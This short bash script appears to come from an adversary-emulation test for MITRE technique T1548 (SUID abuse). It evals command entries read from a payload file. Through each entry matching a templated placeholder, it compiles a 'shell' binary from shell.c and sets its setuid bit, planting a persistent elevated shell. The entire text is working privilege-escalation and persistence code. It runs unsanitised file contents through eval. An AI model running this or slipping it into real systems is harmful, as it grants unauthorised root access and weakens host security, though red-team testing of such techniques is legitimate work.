eval "suidGTFO=($(cat payload.txt | tr '\n' ' '))"
for ((suid = 0; suid < ${#suidGTFO[@]}; suid++));do
    if [[ "${suidGTFO[$suid]}" == *"#{json.T1548.suid}"* ]]; then
        echo "gcc -o shell shell.c" | eval ${suidGTFO[$suid]}
        echo "chmod +s shell" | eval ${suidGTFO[$suid]}
        fi
    done;